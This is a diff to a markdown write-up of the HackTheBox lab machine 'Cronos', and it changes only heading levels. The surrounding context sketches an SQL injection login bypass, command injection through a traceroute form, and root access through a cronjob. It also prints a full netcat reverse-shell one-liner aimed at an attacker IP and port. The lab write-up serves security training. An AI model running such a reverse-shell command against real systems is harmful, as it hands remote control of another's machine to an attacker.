@@ -13,15 +13,15 @@ img_path: /assets/img/hackthebox/machines/cronos
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Cronos](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com). A medium linux box where we bypass a login page using sqli and find a command injection vulnerability that we exploit to get foothold. After that we exploit a cronjob to get root access.
 
 ![](0.png)
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -52,7 +52,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 We found three open ports, 22 running OpenSSH, 53 is DNS and 80 is an Apache http web server, all running on Ubuntu.
 
-## Web
+### Web
 
 Let's check the web page.
 
@@ -142,7 +142,7 @@ It's a login page, i tried some default credentials and failed but managed to lo
 
 ![](4.png)
 
-# **Foothold**
+## **Foothold**
 
 After login in successfully i saw that we can run traceroute, so i wasted no time and tested for command injection.
 
@@ -157,7 +157,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.17.90 9001 >/tmp/f
 ![](6.png)
 
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
 Checking the `/etc/crontab` we see a cronjob running every minute.
 
